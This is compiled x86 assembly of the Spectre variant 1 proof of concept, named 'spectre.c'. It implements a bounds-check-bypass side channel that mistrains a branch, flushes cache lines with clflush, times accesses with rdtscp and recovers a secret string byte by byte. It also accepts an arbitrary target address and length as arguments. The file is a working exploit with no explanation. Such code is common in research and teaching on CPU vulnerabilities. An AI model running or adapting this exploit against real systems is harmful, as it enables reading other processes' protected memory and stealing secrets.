	.file	"spectre.c"
	.intel_syntax noprefix
	.text
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused2
	.bss
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array2
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	secret
	.section	.rodata
	.align 4
.LC0:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 4
	.type	secret, @object
	.size	secret, 4
secret:
	.long	.LC0
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	temp1
	.align 8
	.type	temp1, @object
	.size	temp1, 8
temp1:
	.zero	8
	.text
	.globl	check
	.type	check, @function
check:
.LFB4271:
	.cfi_startproc
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	mov	ebp, esp
	.cfi_def_cfa_register 5
	call	__x86.get_pc_thunk.ax
	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	eax, DWORD PTR array1_size@GOTOFF[eax]
	cmp	DWORD PTR 8[ebp], eax
	jnb	.L2
	mov	eax, 1
	jmp	.L3
.L2:
	mov	eax, 0
.L3:
	pop	ebp
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4271:
	.size	check, .-check
	.globl	leakByteNoinlineFunction
	.type	leakByteNoinlineFunction, @function
leakByteNoinlineFunction:
.LFB4272:
	.cfi_startproc
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	mov	ebp, esp
	.cfi_def_cfa_register 5
	call	__x86.get_pc_thunk.ax
	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	lea	ecx, array2@GOTOFF[eax]
	mov	edx, DWORD PTR 8[ebp]
	add	edx, ecx
	movzx	ecx, BYTE PTR [edx]
	movzx	edx, BYTE PTR temp@GOTOFF[eax]
	and	edx, ecx
	mov	BYTE PTR temp@GOTOFF[eax], dl
	nop
	pop	ebp
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4272:
	.size	leakByteNoinlineFunction, .-leakByteNoinlineFunction
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB4273:
	.cfi_startproc
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	mov	ebp, esp
	.cfi_def_cfa_register 5
	call	__x86.get_pc_thunk.ax
	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	edx, DWORD PTR array1_size@GOTOFF[eax]
	cmp	DWORD PTR 8[ebp], edx
	jnb	.L7
	lea	edx, array1@GOTOFF[eax]
	mov	eax, DWORD PTR 8[ebp]
	add	eax, edx
	movzx	eax, BYTE PTR [eax]
	movzx	eax, al
	sal	eax, 9
	push	eax
	call	leakByteNoinlineFunction
	add	esp, 4
.L7:
	nop
	leave
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4273:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB4274:
	.cfi_startproc
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	mov	ebp, esp
	.cfi_def_cfa_register 5
	push	edi
	push	esi
	push	ebx
	sub	esp, 92
	.cfi_offset 7, -12
	.cfi_offset 6, -16
	.cfi_offset 3, -20
	call	__x86.get_pc_thunk.bx
	add	ebx, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	eax, DWORD PTR 12[ebp]
	mov	DWORD PTR -92[ebp], eax
	mov	eax, DWORD PTR 16[ebp]
	mov	DWORD PTR -96[ebp], eax
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR -28[ebp], eax
	xor	eax, eax
	mov	DWORD PTR -84[ebp], 0
	mov	DWORD PTR -72[ebp], 0
	jmp	.L9
.L10:
	mov	eax, DWORD PTR -72[ebp]
	mov	DWORD PTR results.0@GOTOFF[ebx+eax*4], 0
	add	DWORD PTR -72[ebp], 1
.L9:
	cmp	DWORD PTR -72[ebp], 255
	jle	.L10
	mov	DWORD PTR -76[ebp], 999
	jmp	.L11
.L31:
	mov	DWORD PTR -72[ebp], 0
	jmp	.L12
.L13:
	mov	eax, DWORD PTR -72[ebp]
	sal	eax, 9
	mov	edx, eax
	lea	eax, array2@GOTOFF[ebx]
	add	eax, edx
	mov	DWORD PTR -44[ebp], eax
	mov	eax, DWORD PTR -44[ebp]
	clflush	[eax]
	nop
	add	DWORD PTR -72[ebp], 1
.L12:
	cmp	DWORD PTR -72[ebp], 255
	jle	.L13
	mov	ecx, DWORD PTR array1_size@GOTOFF[ebx]
	mov	eax, DWORD PTR -76[ebp]
	cdq
	idiv	ecx
	mov	eax, edx
	mov	DWORD PTR -60[ebp], eax
	mov	DWORD PTR -68[ebp], 29
	jmp	.L14
.L17:
	lea	eax, array1_size@GOTOFF[ebx]
	mov	DWORD PTR -40[ebp], eax
	mov	eax, DWORD PTR -40[ebp]
	clflush	[eax]
	nop
	mov	DWORD PTR -80[ebp], 0
	jmp	.L15
.L16:
	mov	eax, DWORD PTR -80[ebp]
	add	eax, 1
	mov	DWORD PTR -80[ebp], eax
.L15:
	mov	eax, DWORD PTR -80[ebp]
	cmp	eax, 99
	jle	.L16
	mov	ecx, DWORD PTR -68[ebp]
	mov	edx, 715827883
	mov	eax, ecx
	imul	edx
	mov	eax, ecx
	sar	eax, 31
	sub	edx, eax
	mov	eax, edx
	add	eax, eax
	add	eax, edx
	add	eax, eax
	sub	ecx, eax
	mov	edx, ecx
	lea	eax, -1[edx]
	mov	ax, 0
	mov	DWORD PTR -48[ebp], eax
	mov	eax, DWORD PTR -48[ebp]
	shr	eax, 16
	or	DWORD PTR -48[ebp], eax
	mov	eax, DWORD PTR 8[ebp]
	xor	eax, DWORD PTR -60[ebp]
	and	eax, DWORD PTR -48[ebp]
	xor	eax, DWORD PTR -60[ebp]
	mov	DWORD PTR -48[ebp], eax
	push	DWORD PTR -48[ebp]
	call	victim_function
	add	esp, 4
	sub	DWORD PTR -68[ebp], 1
.L14:
	cmp	DWORD PTR -68[ebp], 0
	jns	.L17
	mov	DWORD PTR -72[ebp], 0
	jmp	.L18
.L22:
	mov	eax, DWORD PTR -72[ebp]
	imul	eax, eax, 167
	add	eax, 13
	and	eax, 255
	mov	DWORD PTR -56[ebp], eax
	mov	eax, DWORD PTR -56[ebp]
	sal	eax, 9
	mov	edx, eax
	lea	eax, array2@GOTOFF[ebx]
	add	eax, edx
	mov	DWORD PTR -52[ebp], eax
	lea	eax, -84[ebp]
	mov	DWORD PTR -32[ebp], eax
	rdtscp
	mov	esi, ecx
	mov	ecx, DWORD PTR -32[ebp]
	mov	DWORD PTR [ecx], esi
	mov	DWORD PTR -104[ebp], eax
	mov	DWORD PTR -100[ebp], edx
	mov	eax, DWORD PTR -52[ebp]
	movzx	eax, BYTE PTR [eax]
	movzx	eax, al
	mov	DWORD PTR -84[ebp], eax
	lea	eax, -84[ebp]
	mov	DWORD PTR -36[ebp], eax
	rdtscp
	mov	esi, ecx
	mov	ecx, DWORD PTR -36[ebp]
	mov	DWORD PTR [ecx], esi
	mov	esi, eax
	mov	edi, edx
	sub	esi, DWORD PTR -104[ebp]
	sbb	edi, DWORD PTR -100[ebp]
	mov	edx, 100
	mov	eax, 0
	cmp	edx, esi
	sbb	eax, edi
	jc	.L21
	mov	ecx, DWORD PTR array1_size@GOTOFF[ebx]
	mov	eax, DWORD PTR -76[ebp]
	cdq
	idiv	ecx
	mov	eax, edx
	movzx	eax, BYTE PTR array1@GOTOFF[ebx+eax]
	movzx	eax, al
	cmp	DWORD PTR -56[ebp], eax
	je	.L21
	mov	eax, DWORD PTR -56[ebp]
	mov	eax, DWORD PTR results.0@GOTOFF[ebx+eax*4]
	lea	edx, 1[eax]
	mov	eax, DWORD PTR -56[ebp]
	mov	DWORD PTR results.0@GOTOFF[ebx+eax*4], edx
.L21:
	add	DWORD PTR -72[ebp], 1
.L18:
	cmp	DWORD PTR -72[ebp], 255
	jle	.L22
	mov	DWORD PTR -64[ebp], -1
	mov	eax, DWORD PTR -64[ebp]
	mov	DWORD PTR -68[ebp], eax
	mov	DWORD PTR -72[ebp], 0
	jmp	.L23
.L28:
	cmp	DWORD PTR -68[ebp], 0
	js	.L24
	mov	eax, DWORD PTR -72[ebp]
	mov	edx, DWORD PTR results.0@GOTOFF[ebx+eax*4]
	mov	eax, DWORD PTR -68[ebp]
	mov	eax, DWORD PTR results.0@GOTOFF[ebx+eax*4]
	cmp	edx, eax
	jl	.L25
.L24:
	mov	eax, DWORD PTR -68[ebp]
	mov	DWORD PTR -64[ebp], eax
	mov	eax, DWORD PTR -72[ebp]
	mov	DWORD PTR -68[ebp], eax
	jmp	.L26
.L25:
	cmp	DWORD PTR -64[ebp], 0
	js	.L27
	mov	eax, DWORD PTR -72[ebp]
	mov	edx, DWORD PTR results.0@GOTOFF[ebx+eax*4]
	mov	eax, DWORD PTR -64[ebp]
	mov	eax, DWORD PTR results.0@GOTOFF[ebx+eax*4]
	cmp	edx, eax
	jl	.L26
.L27:
	mov	eax, DWORD PTR -72[ebp]
	mov	DWORD PTR -64[ebp], eax
.L26:
	add	DWORD PTR -72[ebp], 1
.L23:
	cmp	DWORD PTR -72[ebp], 255
	jle	.L28
	mov	eax, DWORD PTR -64[ebp]
	mov	eax, DWORD PTR results.0@GOTOFF[ebx+eax*4]
	add	eax, 2
	lea	edx, [eax+eax]
	mov	eax, DWORD PTR -68[ebp]
	mov	eax, DWORD PTR results.0@GOTOFF[ebx+eax*4]
	cmp	edx, eax
	jl	.L29
	mov	eax, DWORD PTR -68[ebp]
	mov	eax, DWORD PTR results.0@GOTOFF[ebx+eax*4]
	cmp	eax, 2
	jne	.L30
	mov	eax, DWORD PTR -64[ebp]
	mov	eax, DWORD PTR results.0@GOTOFF[ebx+eax*4]
	test	eax, eax
	je	.L29
.L30:
	sub	DWORD PTR -76[ebp], 1
.L11:
	cmp	DWORD PTR -76[ebp], 0
	jg	.L31
.L29:
	mov	eax, DWORD PTR results.0@GOTOFF[ebx]
	mov	edx, eax
	mov	eax, DWORD PTR -84[ebp]
	xor	eax, edx
	mov	DWORD PTR results.0@GOTOFF[ebx], eax
	mov	eax, DWORD PTR -68[ebp]
	mov	edx, eax
	mov	eax, DWORD PTR -92[ebp]
	mov	BYTE PTR [eax], dl
	mov	eax, DWORD PTR -68[ebp]
	mov	edx, DWORD PTR results.0@GOTOFF[ebx+eax*4]
	mov	eax, DWORD PTR -96[ebp]
	mov	DWORD PTR [eax], edx
	mov	eax, DWORD PTR -92[ebp]
	add	eax, 1
	mov	edx, DWORD PTR -64[ebp]
	mov	BYTE PTR [eax], dl
	mov	eax, DWORD PTR -96[ebp]
	lea	edx, 4[eax]
	mov	eax, DWORD PTR -64[ebp]
	mov	eax, DWORD PTR results.0@GOTOFF[ebx+eax*4]
	mov	DWORD PTR [edx], eax
	nop
	mov	eax, DWORD PTR -28[ebp]
	sub	eax, DWORD PTR gs:20
	je	.L32
	call	__stack_chk_fail_local
.L32:
	lea	esp, -12[ebp]
	pop	ebx
	.cfi_restore 3
	pop	esi
	.cfi_restore 6
	pop	edi
	.cfi_restore 7
	pop	ebp
	.cfi_restore 5
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4274:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata
	.align 4
.LC1:
	.string	"Putting '%s' in memory, address %p\n"
.LC2:
	.string	"%p"
.LC3:
	.string	"%d"
	.align 4
.LC4:
	.string	"Trying malicious_x = %p, len = %d\n"
.LC5:
	.string	"Reading %d bytes:\n"
	.align 4
.LC6:
	.string	"Reading at malicious_x = %p secc= %c ..."
.LC7:
	.string	"Success"
.LC8:
	.string	"Unclear"
.LC9:
	.string	"%s: "
.LC10:
	.string	"0x%02X='%c' score=%d "
	.align 4
.LC11:
	.string	"(second best: 0x%02X='%c' score=%d)"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4275:
	.cfi_startproc
	lea	ecx, 4[esp]
	.cfi_def_cfa 1, 0
	and	esp, -16
	push	DWORD PTR -4[ecx]
	push	ebp
	mov	ebp, esp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	push	esi
	push	ebx
	push	ecx
	.cfi_escape 0xf,0x3,0x75,0x74,0x6
	.cfi_escape 0x10,0x6,0x2,0x75,0x7c
	.cfi_escape 0x10,0x3,0x2,0x75,0x78
	sub	esp, 76
	call	__x86.get_pc_thunk.bx
	add	ebx, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	esi, ecx
	mov	eax, DWORD PTR 4[esi]
	mov	DWORD PTR -76[ebp], eax
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR -28[ebp], eax
	xor	eax, eax
.L51:
	call	getchar@PLT
	mov	BYTE PTR -57[ebp], al
	cmp	BYTE PTR -57[ebp], 114
	jne	.L34
	mov	edx, DWORD PTR secret@GOTOFF[ebx]
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	sub	esp, 4
	push	edx
	push	eax
	lea	eax, .LC1@GOTOFF[ebx]
	push	eax
	call	printf@PLT
	add	esp, 16
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	lea	edx, array1@GOTOFF[ebx]
	sub	eax, edx
	mov	DWORD PTR -56[ebp], eax
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	sub	esp, 12
	push	eax
	call	strlen@PLT
	add	esp, 16
	mov	DWORD PTR -52[ebp], eax
	mov	DWORD PTR -48[ebp], 0
	jmp	.L35
.L36:
	lea	edx, array2@GOTOFF[ebx]
	mov	eax, DWORD PTR -48[ebp]
	add	eax, edx
	mov	BYTE PTR [eax], 1
	add	DWORD PTR -48[ebp], 1
.L35:
	cmp	DWORD PTR -48[ebp], 131071
	jbe	.L36
	cmp	DWORD PTR [esi], 3
	jne	.L37
	mov	eax, DWORD PTR -76[ebp]
	add	eax, 4
	mov	eax, DWORD PTR [eax]
	sub	esp, 4
	lea	edx, -56[ebp]
	push	edx
	lea	edx, .LC2@GOTOFF[ebx]
	push	edx
	push	eax
	call	__isoc99_sscanf@PLT
	add	esp, 16
	mov	eax, DWORD PTR -56[ebp]
	lea	edx, array1@GOTOFF[ebx]
	sub	eax, edx
	mov	DWORD PTR -56[ebp], eax
	mov	eax, DWORD PTR -76[ebp]
	add	eax, 8
	mov	eax, DWORD PTR [eax]
	sub	esp, 4
	lea	edx, -52[ebp]
	push	edx
	lea	edx, .LC3@GOTOFF[ebx]
	push	edx
	push	eax
	call	__isoc99_sscanf@PLT
	add	esp, 16
	mov	eax, DWORD PTR -52[ebp]
	mov	edx, DWORD PTR -56[ebp]
	sub	esp, 4
	push	eax
	push	edx
	lea	eax, .LC4@GOTOFF[ebx]
	push	eax
	call	printf@PLT
	add	esp, 16
.L37:
	mov	eax, DWORD PTR -52[ebp]
	sub	esp, 8
	push	eax
	lea	eax, .LC5@GOTOFF[ebx]
	push	eax
	call	printf@PLT
	add	esp, 16
	mov	DWORD PTR -44[ebp], 0
	jmp	.L38
.L46:
	mov	edx, DWORD PTR secret@GOTOFF[ebx]
	mov	eax, DWORD PTR -44[ebp]
	add	eax, edx
	movzx	eax, BYTE PTR [eax]
	movsx	eax, al
	mov	edx, DWORD PTR -56[ebp]
	sub	esp, 4
	push	eax
	push	edx
	lea	eax, .LC6@GOTOFF[ebx]
	push	eax
	call	printf@PLT
	add	esp, 16
	add	DWORD PTR -44[ebp], 1
	mov	eax, DWORD PTR -56[ebp]
	lea	edx, 1[eax]
	mov	DWORD PTR -56[ebp], edx
	sub	esp, 4
	lea	edx, -40[ebp]
	push	edx
	lea	edx, -30[ebp]
	push	edx
	push	eax
	call	readMemoryByte
	add	esp, 16
	mov	eax, DWORD PTR -40[ebp]
	mov	edx, DWORD PTR -36[ebp]
	add	edx, edx
	cmp	eax, edx
	jl	.L39
	lea	eax, .LC7@GOTOFF[ebx]
	jmp	.L40
.L39:
	lea	eax, .LC8@GOTOFF[ebx]
.L40:
	sub	esp, 8
	push	eax
	lea	eax, .LC9@GOTOFF[ebx]
	push	eax
	call	printf@PLT
	add	esp, 16
	mov	ecx, DWORD PTR -40[ebp]
	movzx	eax, BYTE PTR -30[ebp]
	cmp	al, 31
	jbe	.L41
	movzx	eax, BYTE PTR -30[ebp]
	cmp	al, 126
	ja	.L41
	movzx	eax, BYTE PTR -30[ebp]
	movzx	eax, al
	jmp	.L42
.L41:
	mov	eax, 63
.L42:
	movzx	edx, BYTE PTR -30[ebp]
	movzx	edx, dl
	push	ecx
	push	eax
	push	edx
	lea	eax, .LC10@GOTOFF[ebx]
	push	eax
	call	printf@PLT
	add	esp, 16
	mov	eax, DWORD PTR -36[ebp]
	test	eax, eax
	jle	.L43
	mov	ecx, DWORD PTR -36[ebp]
	movzx	eax, BYTE PTR -29[ebp]
	cmp	al, 31
	jbe	.L44
	movzx	eax, BYTE PTR -29[ebp]
	cmp	al, 126
	ja	.L44
	movzx	eax, BYTE PTR -29[ebp]
	movzx	eax, al
	jmp	.L45
.L44:
	mov	eax, 63
.L45:
	movzx	edx, BYTE PTR -29[ebp]
	movzx	edx, dl
	push	ecx
	push	eax
	push	edx
	lea	eax, .LC11@GOTOFF[ebx]
	push	eax
	call	printf@PLT
	add	esp, 16
.L43:
	sub	esp, 12
	push	10
	call	putchar@PLT
	add	esp, 16
.L38:
	mov	eax, DWORD PTR -52[ebp]
	sub	eax, 1
	mov	DWORD PTR -52[ebp], eax
	mov	eax, DWORD PTR -52[ebp]
	test	eax, eax
	jns	.L46
	jmp	.L51
.L34:
	cmp	BYTE PTR -57[ebp], 10
	je	.L54
	cmp	BYTE PTR -57[ebp], 105
	jne	.L55
	call	getpid@PLT
	mov	ecx, eax
	lea	eax, check@GOTOFF[ebx]
	cdq
	add	eax, 33
	adc	edx, 0
	push	ecx
	push	edx
	push	eax
	lea	eax, .LC12@GOTOFF[ebx]
	push	eax
	call	printf@PLT
	add	esp, 16
	jmp	.L51
.L54:
	nop
	jmp	.L51
.L55:
	nop
	mov	eax, 0
	mov	edx, DWORD PTR -28[ebp]
	sub	edx, DWORD PTR gs:20
	je	.L53
	call	__stack_chk_fail_local
.L53:
	lea	esp, -12[ebp]
	pop	ecx
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	pop	ebx
	.cfi_restore 3
	pop	esi
	.cfi_restore 6
	pop	ebp
	.cfi_restore 5
	lea	esp, -4[ecx]
	.cfi_def_cfa 4, 4
	ret
	.cfi_endproc
.LFE4275:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.section	.text.__x86.get_pc_thunk.ax,"axG",@progbits,__x86.get_pc_thunk.ax,comdat
	.globl	__x86.get_pc_thunk.ax
	.hidden	__x86.get_pc_thunk.ax
	.type	__x86.get_pc_thunk.ax, @function
__x86.get_pc_thunk.ax:
.LFB4276:
	.cfi_startproc
	mov	eax, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE4276:
	.section	.text.__x86.get_pc_thunk.bx,"axG",@progbits,__x86.get_pc_thunk.bx,comdat
	.globl	__x86.get_pc_thunk.bx
	.hidden	__x86.get_pc_thunk.bx
	.type	__x86.get_pc_thunk.bx, @function
__x86.get_pc_thunk.bx:
.LFB4277:
	.cfi_startproc
	mov	ebx, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE4277:
	.hidden	__stack_chk_fail_local
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
